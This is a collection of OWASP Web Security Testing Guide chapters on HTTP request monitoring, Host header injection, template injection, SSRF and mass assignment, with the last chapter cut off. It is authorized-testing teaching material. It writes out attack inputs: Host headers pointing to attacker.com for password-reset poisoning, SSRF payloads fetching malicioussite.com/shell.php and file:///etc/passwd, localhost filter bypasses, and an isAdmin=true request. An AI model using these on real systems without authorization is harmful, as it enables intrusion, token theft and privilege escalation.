{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Incoming_Requests.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Incoming_Requests.md", "content": "# Testing for HTTP Incoming Requests\n\n|ID          |\n|------------|\n|WSTG-INPV-16|\n\n## Summary\n\nThis section describes how to monitor all incoming/outgoing HTTP requests on both client-side or server-side. The purpose of this testing is to verify if there is unnecessary or suspicious HTTP request sending in the background.\n\nMost of Web security testing tools (i.e. AppScan, BurpSuite, ZAP) act as HTTP Proxy. This will require changes of proxy on client-side application or browser. The testing techniques listed below is primary focused on how we can monitor HTTP requests without changes of client-side which will be more close to production usage scenario.\n\n## Test Objectives\n\n- Monitor all incoming and outgoing HTTP requests to the Web Server to inspect any suspicious requests.\n- Monitor HTTP traffic without changes of end user Browser proxy or client-side application.\n\n## How to Test\n\n### Reverse Proxy\n\nThere are situations where we would like to monitor all HTTP incoming requests on the web server but we can't change the configuration on the browser or application client-side. In this scenario, we can setup a reverse proxy on the web server and to monitor all incoming/outgoing requests on the web server.\n\nFor windows platform, Fiddler Classic is recommended. It provides not only monitor but can also edit/reply the HTTP requests. Refer to [this reference for how to configure Fiddler as reverse Proxy](https://docs.telerik.com/fiddler/configure-fiddler/tasks/usefiddlerasreverseproxy)\n\nFor Linux platform, Charles Web Debugging Proxy may be used.\n\nThe testing steps:\n\n1. Install Fiddler or Charles on Web Server\n2. Configure the Fiddler or Charles as Reverse Proxy\n3. Capture the HTTP traffic\n4. Inspect HTTP traffic\n5. Modify HTTP requests and replay the modified requests for testing\n\n### Port Forwarding\n\nPort forwarding is another way to allow us intercept HTTP requests without changes of client-side. You can also use Charles as a SOCKS proxy to act as port forwarding or uses of Port Forwarding tools. It will allow us to forward all coming client-side captured traffic to web server port.\n\nThe testing flow will be:\n\n1. Install the Charles or port forwarding on another machine or web Server\n2. Configure the Charles as Socks proxy as port forwarding.\n\n### TCP-level Network Traffic Capture\n\nThis technique monitor all the network traffic at TCP-level. TCPDump or WireShark tools can be used. However, these tools don't allow us edit the captured traffic and send modified HTTP requests for testing. To replay the captured traffic (PCAP) packets, Ostinato can be used.\n\nThe testing steps will be:\n\n1. Activate TCPDump or WireShark on Web Server to capture network traffic\n2. Monitor the captured files (PCAP)\n3. Edit PCAP files by Ostinato tool based on need\n4. Reply the HTTP requests\n\nFiddler or Charles are recommended since these tools can capture HTTP traffic and also easily edit/reply the modified HTTP requests. In addition, if the web traffic is HTTPS, the wireshark will need to import the web server private key to inspect the HTTPS message body. Otherwise, the HTTPS message body of the captured traffic will all be encrypted.\n\n## Tools\n\n- [Fiddler](https://www.telerik.com/fiddler/)\n- [TCPProxy](https://grinder.sourceforge.net/g3/tcpproxy.html)\n- [Charles Web Debugging Proxy](https://www.charlesproxy.com/)\n- [WireShark](https://www.wireshark.org/)\n- [PowerEdit-Pcap](https://sourceforge.net/projects/powereditpcap/)\n- [pcapteller](https://github.com/BlackArch/pcapteller)\n- [replayproxy](https://github.com/sparrowt/replayproxy)\n- [Ostinato](https://ostinato.org/)\n\n## References\n\n- [Charles Web Debugging Proxy](https://www.charlesproxy.com/)\n- [Fiddler](https://www.telerik.com/fiddler/)\n- [TCPDUMP](https://www.tcpdump.org/)\n- [Ostinato](https://ostinato.org/)\n", "timestamp": "2025-10-24T11:39:53.988230"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection.md", "content": "# Testing for Host Header Injection\n\n|ID          |\n|------------|\n|WSTG-INPV-17|\n\n## Summary\n\nA web server commonly hosts several web applications on the same IP address, referring to each application via the virtual host. In an incoming HTTP request, web servers often dispatch the request to the target virtual host based on the value supplied in the Host header. Without proper validation of the header value, the attacker can supply invalid input to cause the web server to:\n\n- Dispatch requests to the first virtual host on the list.\n- Perform a redirect to an attacker-controlled domain.\n- Perform web cache poisoning.\n- Manipulate password reset functionality.\n- Allow access to virtual hosts that were not intended to be externally accessible.\n\n## Test Objectives\n\n- Assess if the Host header is being parsed dynamically in the application.\n- Bypass security controls that rely on the header.\n\n## How to Test\n\nInitial testing is as simple as supplying another domain (i.e. `attacker.com`) into the Host header field. It is how the web server processes the header value that dictates the impact. The attack is valid when the web server processes the input to send the request to an attacker-controlled host that resides at the supplied domain, and not to an internal virtual host that resides on the web server.\n\n```http\nGET / HTTP/1.1\nHost: www.attacker.com\n[...]\n```\n\nIn the simplest case, this may cause a 302 redirect to the supplied domain.\n\n```http\nHTTP/1.1 302 Found\n[...]\nLocation: https://www.attacker.com/login.php\n\n```\n\nAlternatively, the web server may send the request to the first virtual host on the list.\n\n### X-Forwarded Host Header Bypass\n\nIn the event that Host header injection is mitigated by checking for invalid input injected via the Host header, you can supply the value to the `X-Forwarded-Host` header.\n\n```http\nGET / HTTP/1.1\nHost: www.example.com\nX-Forwarded-Host: www.attacker.com\n[...]\n```\n\nPotentially producing client-side output such as:\n\n```html\n[...]\n<link src=\"https://www.attacker.com/link\" />\n[...]\n```\n\nOnce again, this depends on how the web server processes the header value.\n\n### Web Cache Poisoning\n\nUsing this technique, an attacker can manipulate a web-cache to serve poisoned content to anyone who requests it. This relies on the ability to poison the caching proxy run by the application itself, CDNs, or other downstream providers. As a result, the victim will have no control over receiving the malicious content when requesting the vulnerable application.\n\n```http\nGET / HTTP/1.1\nHost: www.attacker.com\n[...]\n```\n\nThe following will be served from the web cache, when a victim visits the vulnerable application.\n\n```html\n[...]\n<link src=\"https://www.attacker.com/link\" />\n[...]\n```\n\n### Password Reset Poisoning\n\nIt is common for password reset functionality to include the Host header value when creating password reset links that use a generated secret token. If the application processes an attacker-controlled domain to create a password reset link, the victim may click on the link in the email and allow the attacker to obtain the reset token, thus resetting the victim's password.\n\nThe example below shows a password reset link that is generated in PHP using the value of `$_SERVER['HTTP_HOST']`, which is set based on the contents of the HTTP Host header:\n\n```php\n$reset_url = \"https://\" . $_SERVER['HTTP_HOST'] . \"/reset.php?token=\" .$token;\nsend_reset_email($email,$rset_url);\n```\n\nBy making a HTTP request to the password reset page with a tampered Host header, we can modify where the URL points:\n\n```http\nPOST /request_password_reset.php HTTP/1.1\nHost: www.attacker.com\n[...]\n\nemail=user@example.org\n```\n\nThe specified domain (`www.attacker.com`) will then be used in the reset link, which is emailed to the user. When the user clicks this link, the attacker can steal the token and compromise their account.\n\n```text\n... Email snippet ...\n\nClick on the following link to reset your password:\n\nhttps://www.attacker.com/reset.php?token=12345\n\n... Email snippet ...\n```\n\n### Accessing Private Virtual Hosts\n\nIn some cases a server may have virtual hosts that are not intended to be externally accessible. This is most common with a [split-horizon](https://en.wikipedia.org/wiki/Split-horizon_DNS) DNS setup (where internal and external DNS servers return different records for the same domain).\n\nFor example, an organization may have a single webserver on their internal network, which hosts both their public website (on `www.example.org`) and their internal Intranet (on `intranet.example.org`, but that record only exists on the internal DNS server). Although it would not be possible to browse directly to `intranet.example.org` from outside the network (as the domain would not resolve), it may be possible to access to Intranet by making a request from outside with the following `Host` header:\n\n```http\nHost: intranet.example.org\n```\n\nThis could also be achieved by adding an entry for `intranet.example.org` to your hosts file with the public IP address of `www.example.org`, or by overriding DNS resolution in your testing tool.\n\n## References\n\n- [What is a Host Header Attack?](https://www.acunetix.com/blog/articles/automated-detection-of-host-header-attacks/)\n- [Host Header Attack](https://www.briskinfosec.com/blogs/blogsdetail/Host-Header-Attack)\n- [HTTP Host header attacks](https://portswigger.net/web-security/host-header)\n", "timestamp": "2025-10-24T11:39:54.078386"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection.md", "content": "# Testing for Server-side Template Injection\n\n|ID          |\n|------------|\n|WSTG-INPV-18|\n\n## Summary\n\nWeb applications commonly use server-side templating technologies (Jinja2, Twig, FreeMaker, etc.) to generate dynamic HTML responses. Server-side Template Injection vulnerabilities (SSTI) occur when user input is embedded in a template in an unsafe manner and results in remote code execution on the server. Any features that support advanced user-supplied markup may be vulnerable to SSTI including wiki-pages, reviews, marketing applications, CMS systems etc. Some template engines employ various mechanisms (eg. sandbox, allow listing, etc.) to protect against SSTI.\n\n### Example - Twig\n\nThe following example is an excerpt from the [Extreme Vulnerable Web Application](https://github.com/s4n7h0/xvwa) project.\n\n```php\npublic function getFilter($name)\n{\n        [snip]\n        foreach ($this->filterCallbacks as $callback) {\n        if (false !== $filter = call_user_func($callback, $name)) {\n            return $filter;\n        }\n    }\n    return false;\n}\n```\n\nIn the getFilter function the `call_user_func($callback, $name)` is vulnerable to SSTI: the `name` parameter is fetched from the HTTP GET request and executed by the server:\n\n![SSTI XVWA Example](images/SSTI_XVWA.jpeg)\\\n*Figure 4.7.18-1: SSTI XVWA Example*\n\n### Example - Flask/Jinja2\n\nThe following example uses Flask and Jinja2 templating engine. The `page` function accepts a 'name' parameter from an HTTP GET request and renders an HTML response with the `name` variable content:\n\n```python\n@app.route(\"/page\")\ndef page():\n    name = request.values.get('name')\n    output = Jinja2.from_string('Hello ' + name + '!').render()\n    return output\n```\n\nThis code snippet is vulnerable to XSS but it is also vulnerable to SSTI. Using the following as a payload in the `name` parameter:\n\n```bash\n$ curl -g 'https://www.target.com/page?name={{7*7}}'\nHello 49!\n```\n\n## Test Objectives\n\n- Detect template injection vulnerability points.\n- Identify the templating engine.\n- Build the exploit.\n\n## How to Test\n\nSSTI vulnerabilities exist either in text or code context. In plaintext context users allowed to use freeform 'text' with direct HTML code. In code context the user input may also be placed within a template statement (eg. in a variable name)\n\n### Identify Template Injection Vulnerability\n\nThe first step in testing SSTI in plaintext context is to construct common template expressions used by various template engines as payloads and monitor server responses to identify which template expression was executed by the server.\n\nCommon template expression examples:\n\n```text\na{{bar}}b\na{{7*7}}\n{var} ${var} {{var}} <%var%> [% var %]\n```\n\nIn this step an extensive [template expression test strings/payloads list](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) is recommended.\n\nTesting for SSTI in code context is slightly different. First, the tester constructs the request that result either blank or error server responses. In the example below the HTTP GET parameter is inserted info the variable `personal_greeting` in a template statement:\n\n```text\npersonal_greeting=username\nHello user01\n```\n\nUsing the following payload - the server response is blank \"Hello\":\n\n```text\npersonal_greeting=username<tag>\nHello\n```\n\nIn the next step is to break out of the template statement and injecting HTML tag after it using the following payload\n\n```text\npersonal_greeting=username}}<tag>\nHello user01 <tag>\n```\n\n### Identify the Templating Engine\n\nBased on the information from the previous step now the tester has to identify which template engine is used by supplying various template expressions. Based on the server responses the tester deduces the template engine used. This manual approach is discussed in greater detail in [this](https://portswigger.net/blog/server-side-template-injection?#Identify) PortSwigger article. To automate the identification of the SSTI vulnerability and the templating engine various tools are available including [Tplmap](https://github.com/epinna/tplmap) or the [Backslash Powered Scanner Burp Suite extension](https://github.com/PortSwigger/backslash-powered-scanner).\n\n### Build the RCE Exploit\n\nThe main goal in this step is to identify to gain further control on the server with an RCE exploit by studying the template documentation and research. Key areas of interest are:\n\n- **For template authors** sections covering basic syntax.\n- **Security considerations** sections.\n- Lists of built-in methods, functions, filters, and variables.\n- Lists of extensions/plugins.\n\nThe tester can also identify what other objects, methods and properties can be exposed by focusing on the `self` object. If the `self` object is not available and the documentation does not reveal the technical details, a brute force of the variable name is recommended. Once the object is identified the next step is to loop through the object to identify all the methods, properties and attributes that are accessible through the template engine. This could lead to other kinds of security findings including privilege escalations, information disclosure about application passwords, API keys, configurations and environment variables, etc.\n\n## Tools\n\n- [Tplmap](https://github.com/epinna/tplmap)\n- [Backslash Powered Scanner Burp Suite extension](https://github.com/PortSwigger/backslash-powered-scanner)\n- [Template expression test strings/payloads list](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)\n\n## References\n\n- [James Kettle: Server-Side Template Injection:RCE for the modern webapp (whitepaper)](https://portswigger.net/kb/papers/serversidetemplateinjection.pdf)\n- [Server-Side Template Injection](https://portswigger.net/blog/server-side-template-injection)\n- [Exploring SSTI in Flask/Jinja2](https://www.lanmaster53.com/2016/03/exploring-ssti-flask-jinja2/)\n- [Server-Side Template Injection: from detection to Remote shell](https://www.okiok.com/server-side-template-injection-from-detection-to-remote-shell/)\n- [Extreme Vulnerable Web Application](https://github.com/s4n7h0/xvwa)\n- [Exploiting SSTI in Thymeleaf](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)\n", "timestamp": "2025-10-24T11:39:54.158452"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery.md", "content": "# Testing for Server-Side Request Forgery\n\n|ID          |\n|------------|\n|WSTG-INPV-19|\n\n## Summary\n\nWeb applications often interact with internal or external resources. While you may expect that only the intended resource will be handling the data you send, improperly handled data may create a situation where injection attacks are possible. One type of injection attack is called Server-side Request Forgery (SSRF). A successful SSRF attack can grant the attacker access to restricted actions, internal services, or internal files within the application or the organization. In some cases, it can even lead to Remote Code Execution (RCE).\n\n## Test Objectives\n\n- Identify SSRF injection points.\n- Test if the injection points are exploitable.\n- Asses the severity of the vulnerability.\n\n## How to Test\n\nWhen testing for SSRF, you attempt to make the targeted server inadvertently load or save content that could be malicious. The most common test is for local and remote file inclusion. There is also another facet to SSRF: a trust relationship that often arises where the application server is able to interact with other back-end systems that are not directly reachable by users. These back-end systems often have non-routable private IP addresses or are restricted to certain hosts. Since they are protected by the network topology, they often lack more sophisticated controls. These internal systems often contain sensitive data or functionality.\n\nConsider the following request:\n\n``` http\nGET https://example.com/page?page=about.php\n```\n\nYou can test this request with the following payloads.\n\n### Load the Contents of a File\n\n```http\nGET https://example.com/page?page=https://malicioussite.com/shell.php\n```\n\n### Access a Restricted Page\n\n```http\nGET https://example.com/page?page=http://localhost/admin\n```\n\nOr:\n\n```http\nGET https://example.com/page?page=http://127.0.0.1/admin\n```\n\nUse the loopback interface to access content restricted to the host only. This mechanism implies that if you have access to the host, you also have privileges to directly access the `admin` page.\n\nThese kind of trust relationships, where requests originating from the local machine are handled differently than ordinary requests, are often what enables SSRF to be a critical vulnerability.\n\n### Fetch a Local File\n\n```http\nGET https://example.com/page?page=file:///etc/passwd\n```\n\n### HTTP Methods Used\n\nAll of the payloads above can apply to any type of HTTP request, and could also be injected into header and cookie values as well.\n\nOne important note on SSRF with POST requests is that the SSRF may also manifest in a blind manner, because the application may not return anything immediately. Instead, the injected data may be used in other functionality such as PDF reports, invoice or order handling, etc., which may be visible to employees or staff but not necessarily to the end user or tester.\n\nYou can find more on Blind SSRF [here](https://portswigger.net/web-security/ssrf/blind), or in the [references section](#references).\n\n### PDF Generators\n\nIn some cases, a server may convert uploaded files to PDF format. Try injecting `<iframe>`, `<img>`, `<base>`, or `<script>` elements, or CSS `url()` functions pointing to internal services.\n\n```html\n<iframe src=\"file:///etc/passwd\" width=\"400\" height=\"400\">\n<iframe src=\"file:///c:/windows/win.ini\" width=\"400\" height=\"400\">\n```\n\n### Common Filter Bypass\n\nSome applications block references to `localhost` and `127.0.0.1`. This can be circumvented by:\n\n- Using alternative IP representation that evaluate to `127.0.0.1`:\n    - Decimal notation: `2130706433`\n    - Octal notation: `017700000001`\n    - IP shortening: `127.1`\n- String obfuscation\n- Registering your own domain that resolves to `127.0.0.1`\n\nSometimes the application allows input that matches a certain expression, like a domain. That can be circumvented if the URL schema parser is not properly implemented, resulting in attacks similar to [semantic attacks](https://tools.ietf.org/html/rfc3986#section-7.6).\n\n- Using the `@` character to separate between the userinfo and the host: `https://expected-domain@attacker-domain`\n- URL fragmentation with the `#` character: `https://attacker-domain#expected-domain`\n- URL encoding\n- Fuzzing\n- Combinations of all of the above\n\nFor additional payloads and bypass techniques, see the [references](#references) section.\n\n## Remediation\n\nSSRF is known to be one of the hardest attacks to defeat without the use of allow lists that require specific IPs and URLs to be allowed. For more on SSRF prevention, read the [Server Side Request Forgery Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).\n\n## References\n\n- [swisskyrepo: SSRF Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)\n- [Reading Internal Files Using SSRF Vulnerability](https://medium.com/@neerajedwards/reading-internal-files-using-ssrf-vulnerability-703c5706eefb)\n- [Abusing the AWS Metadata Service Using SSRF Vulnerabilities](https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/)\n- [OWASP Server Side Request Forgery Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)\n- [Portswigger: SSRF](https://portswigger.net/web-security/ssrf)\n- [Portswigger: Blind SSRF](https://portswigger.net/web-security/ssrf/blind)\n- [Bugcrowd Webinar: SSRF](https://www.bugcrowd.com/resources/webinars/server-side-request-forgery/)\n- [Hackerone Blog: SSRF](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF)\n- [Hacker101: SSRF](https://www.hacker101.com/sessions/ssrf.html)\n- [URI Generic Syntax](https://tools.ietf.org/html/rfc3986)\n", "timestamp": "2025-10-24T11:39:54.276574"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment.md", "content": "# Testing for Mass Assignment\n\n|ID          |\n|------------|\n|WSTG-INPV-20|\n\n## Summary\n\nModern web applications are very often based on frameworks. Many of these web application frameworks allow automatic binding of user input (in the form of HTTP request parameters) to internal objects. This is often called autobinding.\nThis feature can be sometimes exploited to access fields that were never intended to be modified from outside leading to privilege escalation, data tampering, bypass of security mechanisms, and more.\nIn this case there is a Mass Assignment vulnerability.\n\nExamples of sensitive properties:\n\n- **Permission-related properties**: should only be set by privileged users (e.g. `is_admin`, `role`, `approved`).\n- **Process-dependent properties**: should only be set internally, after a process is completed (e.g. `balance`, `status`, `email_verified`)\n- **Internal properties**: should only be set internally by the application (e.g. `created_at`, `updated_at`)\n\n## Test Objectives\n\n- Identify requests that modify objects\n- Assess if it is possible to modify fields never intended to be modified from outside\n\n## How to Test\n\nThe following is a classic example that can help to illustrate the issue.\n\nSuppose a Java web application with a `User` object similar to the following:\n\n```java\npublic class User {\n   private String username;\n   private String password;\n   private String email;\n   private boolean isAdmin;\n\n   //Getters & Setters\n}\n```\n\nTo create a new `User` the web application implements the following view:\n\n```html\n<form action=\"/createUser\" method=\"POST\">\n     <input name=\"username\" type=\"text\">\n     <input name=\"password\" type=\"text\">\n     <input name=\"email\" text=\"text\">\n     <input type=\"submit\" value=\"Create\">\n</form>\n```\n\nThe controller that handles the creation request (Spring provides the automatic bind with the `User` model):\n\n```java\n@RequestMapping(value = \"/createUser\", method = RequestMethod.POST)\npublic String createUser(User user) {\n   userService.add(user);\n   return \"successPage\";\n}\n```\n\nWhen the form is submitted, the following request is generated by the browser:\n\n```http\nPOST /createUser\n[...]\nusername=bob&password=supersecretpassword&email=bob@domain.test\n```\n\nHowever, due to the autobinding, an attacker can add the `isAdmin` parameter to the request, which the controller will automatically bind to the model.\n\n```http\nPOST /createUser\n[...]\nusername=bob&password=supersecretpassword&email=bob@domain.test&isAdmin=true\n```\n\nThe user is then created with the `isAdmin` property set to `true`, giving them administrative rights on the application.\n\n### Black-Box Testing\n\n#### Detect Handlers\n\nIn order to determine which part of the application is vulnerable to mass assignment, enumerate all parts of the application that accept content from the user and can potentially be mapped with a model. This includes all HTTP requests (most likely GET, POST, and PUT) that appear to allow create or update operations on the back end.\nOne of the most simple indicators for potential mass assignments is the presence of bracket syntax for input parameter names, as for example:\n\n```html\n<input name=\"user[name]\" type=\"text\">\n```\n\nWhen such patterns are encountered try to add an input related to a non-exiting attribute (e.g. `user[nonexistingattribute]`) and analyze the response/behavior.\nIf the application does not implement any control (e.g. list of allowed fields) it is likely that it will respond with an error (e.g. 500) due to the fact that the application does not find the attribute associated to the object. More interestingly, those errors sometimes facilitate discovery of attribute names and value data types needed to exploit the issue, without access to the source code.\n\n#### Identify Sensitive Fields\n\nSince in black-box testing the tester does not have visibility on the source code, it is necessary to find other ways in order to gather information about the attributes associated to the objects.\nAnalyze the responses received by the back end, in particular pay attention to:\n\n- HTML page source code\n- Custom JavaScript code\n- API responses\n\nFor example, very often, it is possible to exploit handlers that return details about an object in order to gather clues on the associated fields.\nSuppose for example a handler that returns the profile of the user (e.g. `GET /profile`), this may include further attributes related to the user (in this example the `isAdmin` attribute looks particularly interesting).\n\n```json\n{\"_id\":12345,\"username\":\"bob\",\"age\":38,\"email\":\"bob@domain.test\",\"isAdmin\":false}\n```\n\nThen try to exploit handlers that allow the modification or creation of users, adding the `isAdmin` attribute configured to `true`.\n\nAnother approach is to use wordlists in order to try to enumerate all the potential attributes. The enumeration can then be automated (e.g. via wfuzz, Burp Intruder, ZAP fuzzer, etc.). The sqlmap tool includes a [common-columns.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-columns.txt) wordlist that can be useful to identify potential sensitive attributes.\nA small example of common interesting attribute names are the following:\n\n- `is_admin`\n- `is_administrator`\n- `isAdmin`\n- `isAdministrator`\n- `admin`\n- `administrator`\n- `role`\n\nWhen multiple roles are available try to compare requests made by different user levels (pay particular attention to privileged roles). For example, if extra parameters are included in requests made by an administrative user, try those as a low privileged/anonymous user.\n\n#### Check Impact\n\nThe impact of a mass assignment can vary depending on the context therefore, for each test input attempted in the previous phase, analyze the result and determine if it represents a vulnerability that has a realistic impact on the web application's security.\nFor example, the modification of the `id` of an object can lead to application Denial of Service or privilege escalation. Another example is related to the possibility to modify the role/status of the user (e.g. `role` or `isAdmin`) leading to vertical privilege escalation.\n\n### Gray-Box Testing\n\nWhen the analysis is performed with a gray-box testing approach, it is possible to follow the same methodology to verify the issue. However, the greater knowledge on the application allows to more easily identify frameworks and handlers subject to mass assignment vulnerability.\nIn particular, when the source code is available, it is possible to search the input vectors more easily and accurately. During a source code review, use simple tools (such as the grep command) to search for one or more common patterns within the application code.\nAccess to the DB schema or to the source code allows also to easily identify sensitive fields.\n\n#### Java\n\nSpring MVC allows to automatically bind user input into object. Identify the controllers that handle state-changing requests (e.g. find the occurrences of `@RequestMapping`) then verify if controls are in place (both on the controller or on the involved models). Limitations on the exploitation of the mass assignment can be, for example, in the form of:\n\n- list of bindable fields via `setAllowedFields` method of the `DataBinder` class (e.g. `binder.setAllowedFields([\"username\",\"password\",\"email\"])`)\n- list of non-bindable fields via `setDisallowedFields` method of the `DataBinder` class (e.g. `binder.setDisallowedFields([\"isAdmin\"])`)\n\nIt is also advisable to pay attention to the use of the `@ModelAttribute` annotation that allows to specify a different name/key.\n\n#### PHP\n\nLaravel Eloquent ORM provides a `create` method which allows automatic assignment of attributes. However, the latest versions of Eloquent ORM provide default protection against mass assignment vulnerabilities requiring to explicitly specify allowed attributes that can be assigned automatically, through the `$fillable` array, or attributes that have to be protected (non-bindable), trough the `$guarded` array. Therefore by analyzing the models (classes that extend the `Model` class) it is possible to identify which attributes are allowed or denied and therefore point out potential vulnerabilities.\n\n#### .NET\n\nModel binding in ASP.NET automatically bind user inputs to object properties. This also works with complex types and it will automatically convert the input data to the properties if the properties' names match with the input.\nIdentify the controllers then verify if controls are in place (both inside the controller or in the involved models). Limitations on the exploitation of the mass assignment can be, for example, in the form of:\n\n- fields declared as `ReadOnly`\n- list of bindable fields via `Bind` attribute (e.g. `[Bind(Include = \"FirstName, LastName\")] Student std`), via `includeProperties` (e.g. `includeProperties: new[] { \"FirstName, LastName\" }`) or through `TryUpdateModel`\n- list of non-bindable fields via `Bind` attribute (e.g. `[Bind(Exclude = \"Status\")] Student std`) or via `excludeProperties` (e.g. `excludeProperties: new[] { \"Status\" }`)\n\n## Remediation\n\nUse built-in features, provided by frameworks, to define bindable and non-bindable fields. An approach based on allowed fields (bindable), in which only the properties that should be updated by the user are explicitly defined, is preferable.\nAn architectural approach to prevent the issue is to use the *Data Transfer Object* (DTO) pattern in order to avoid direct binding. The DTO should include only the fields that are meant to be editable by the user.\n\n## References\n\n- [OWASP: API Security](https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa6-mass-assignment.md)\n- [OWASP: Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)\n- [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)\n", "timestamp": "2025-10-24T11:39:54.394093"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/README.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/README.md", "content": "# 4.7 Input Validation Testing\n\n4.7.1 [Testing for Reflected Cross Site Scripting](01-Testing_for_Reflected_Cross_Site_Scripting.md)\n\n4.7.2 [Testing for Stored Cross Site Scripting](02-Testing_for_Stored_Cross_Site_Scripting.md)\n\n4.7.3 [Testing for HTTP Verb Tampering](03-Testing_for_HTTP_Verb_Tampering.md)\n\n4.7.4 [Testing for HTTP Parameter Pollution](04-Testing_for_HTTP_Parameter_Pollution.md)\n\n4.7.5 [Testing for SQL Injection](05-Testing_for_SQL_Injection.md)\n\n- 4.7.5.1 [Testing for Oracle](05.1-Testing_for_Oracle.md)\n\n- 4.7.5.2 [Testing for MySQL](05.2-Testing_for_MySQL.md)\n\n- 4.7.5.3 [Testing for SQL Server](05.3-Testing_for_SQL_Server.md)\n\n- 4.7.5.4 [Testing PostgreSQL](05.4-Testing_PostgreSQL.md)\n\n- 4.7.5.5 [Testing for MS Access](05.5-Testing_for_MS_Access.md)\n\n- 4.7.5.6 [Testing for NoSQL Injection](05.6-Testing_for_NoSQL_Injection.md)\n\n- 4.7.5.7 [Testing for ORM Injection](05.7-Testing_for_ORM_Injection.md)\n\n- 4.7.5.8 [Testing for Client-side](05.8-Testing_for_Client-side.md)\n\n4.7.6 [Testing for LDAP Injection](06-Testing_for_LDAP_Injection.md)\n\n4.7.7 [Testing for XML Injection](07-Testing_for_XML_Injection.md)\n\n4.7.8 [Testing for SSI Injection](08-Testing_for_SSI_Injection.md)\n\n4.7.9 [Testing for XPath Injection](09-Testing_for_XPath_Injection.md)\n\n4.7.10 [Testing for IMAP SMTP Injection](10-Testing_for_IMAP_SMTP_Injection.md)\n\n4.7.11 [Testing for Code Injection](11-Testing_for_Code_Injection.md)\n\n- 4.7.11.1 [Testing for File Inclusion](11.1-Testing_for_File_Inclusion.md)\n\n4.7.12 [Testing for Command Injection](12-Testing_for_Command_Injection.md)\n\n4.7.13 [Testing for Format String Injection](13-Testing_for_Format_String_Injection.md)\n\n4.7.14 [Testing for Incubated Vulnerability](14-Testing_for_Incubated_Vulnerability.md)\n\n4.7.15 [Testing for HTTP Splitting Smuggling](15-Testing_for_HTTP_Splitting_Smuggling.md)\n\n4.7.16 [Testing for HTTP Incoming Requests](16-Testing_for_HTTP_Incoming_Requests.md)\n\n4.7.17 [Testing for Host Header Injection](17-Testing_for_Host_Header_Injection.md)\n\n4.7.18 [Testing for Server-side Template Injection](18-Testing_for_Server-side_Template_Injection.md)\n\n4.7.19 [Testing for Server-Side Request Forgery](19-Testing_for_Server-Side_Request_Forgery.md)\n\n4.7.20 [Testing for Mass Assignment](20-Testing_for_Mass_Assignment.md)\n", "timestamp": "2025-10-24T11:39:54.480155"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/01-Testing_For_Improper_Error_Handling.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/01-Testing_For_Improper_Error_Handling.md", "content": "# Testing for Improper Error Handling\n\n|ID          |\n|------------|\n|WSTG-ERRH-01|\n\n## Summary\n\nAll types of applications (web apps, web servers, databases, etc.) will generate errors for various reasons. Developers often ignore handling these errors, or push away the idea that a user will ever try to trigger an error purposefully (*e.g.* sending a string where an integer is expected). When the developer only consider the happy path, they forget all other possible user-input the code can receive but can't handle.\n\nErrors sometimes rise as:\n\n- stack traces,\n- network timeouts,\n- input mismatch,\n- and memory dumps.\n\nImproper error handling can allow attackers to:\n\n- Understand the APIs being used internally.\n- Map the various services integrating with each other by gaining insight on internal systems and frameworks used, which opens up doors to attack chaining.\n- Gather the versions and types of applications being used.\n- DoS the system by forcing the system into a deadlock or an unhandled exception that sends a panic signal to the engine running it.\n- Controls bypass where a certain exception is not restricted by the logic set around the happy path.\n\n## Test Objectives\n\n- Identify existing error output.\n- Analyze the different output returned.\n\n## How to Test\n\nErrors are usually seen as benign as they provide diagnostics data and messages that could help the user understand the problem at hand, or for the developer to debug that error.\n\nBy trying to send unexpected data, or forcing the system into certain edge cases and scenarios, the system or application will, most of the time, give out a bit on what's happening internally, unless the developers turned off all possible errors and return a certain custom message.\n\n### Web Servers\n\nAll web apps run on a web server, whether it was an integrated one or a fully fledged one. Web apps 